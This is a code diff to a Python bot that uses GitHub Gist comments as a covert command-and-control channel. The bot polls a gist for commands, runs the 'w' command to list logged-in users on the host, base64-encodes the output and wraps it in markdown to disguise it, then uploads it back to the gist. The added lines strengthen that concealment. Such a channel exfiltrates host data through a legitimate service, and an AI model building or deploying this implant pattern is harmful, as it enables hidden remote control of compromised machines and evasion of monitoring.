@@ -3,14 +3,16 @@ import subprocess
 import os
 import sys
 import commands as cmd
+import utils as u
 from time import sleep
 from dotenv import load_dotenv
 
 
 class Bot:
     def __init__(self, gist_id, name):
-        self.gist_id = gist_id
         self.name = name
+        self.filename = name + os.getenv("BOT_FILE_EXTENSION")
+        self.gist_url = os.getenv("GITHUB_API_URL") + "gists/" + gist_id
         self.headers = {
             "Accept": "application/vnd.github+json",
             "Authorization": "Bearer " + os.getenv("GITHUB_API_TOKEN"),
@@ -31,7 +33,7 @@ class Bot:
         while True:
             if last_tag is not None:
                 headers.update({"If-None-Match": last_tag})
-            res = requests.get(os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id + "/comments", headers=headers)
+            res = requests.get(self.gist_url + "/comments", headers=headers)
             if res.status_code == 304:
                 sleep(1)
                 continue
@@ -42,17 +44,21 @@ class Bot:
                     print("received command %s" % command)
                     if command == cmd.COMMAND_USERS["command"]:
                         result = subprocess.run(["w"], stdout=subprocess.PIPE)
-                        data = {"files": {(self.name + ".txt"): {"content": result.stdout.decode("utf-8")}}}
-                        res = requests.patch(
-                            os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id, json=data, headers=self.headers
-                        )
+                        data = {
+                            "files": {
+                                self.filename: {
+                                    "content": u.encode_data_to_markdown(u.encode_data_to_base64(result.stdout))
+                                }
+                            }
+                        }
+                        res = requests.patch(self.gist_url, json=data, headers=self.headers)
                         if res.status_code != 200:
                             print("Could not update bot file in Gist")
                             print(res.json())
                             exit(1)
                     data = {"body": "✅ " + comment["body"]}
                     res = requests.patch(
-                        os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id + "/comments/" + str(comment["id"]),
+                        self.gist_url + "/comments/" + str(comment["id"]),
                         json=data,
                         headers=headers,
                     )
@@ -62,15 +68,15 @@ class Bot:
                         exit(1)
 
     def name_available(self):
-        res = requests.get(os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id, headers=self.headers)
+        res = requests.get(self.gist_url, headers=self.headers)
         if res.status_code == 200:
-            return (self.name + ".txt") not in res.json()["files"]
+            return self.filename not in res.json()["files"]
         else:
             return True
 
     def login(self):
-        data = {"files": {(self.name + ".txt"): {"content": "Hello world!"}}}
-        res = requests.patch(os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id, json=data, headers=self.headers)
+        data = {"files": {self.filename: {"content": u.encode_data_to_markdown("")}}}
+        res = requests.patch(self.gist_url, json=data, headers=self.headers)
         if res.status_code != 200:
             print("Could not create file in Gist")
             print(res.json())
@@ -78,8 +84,8 @@ class Bot:
 
     def logout(self):
         print("Exiting...")
-        data = {"files": {(self.name + ".txt"): None}}
-        res = requests.patch(os.getenv("GITHUB_API_URL") + "gists/" + self.gist_id, json=data, headers=self.headers)
+        data = {"files": {self.filename: None}}
+        res = requests.patch(self.gist_url, json=data, headers=self.headers)
         if res.status_code != 200:
             print("Could not delete file in Gist")
             exit(1)
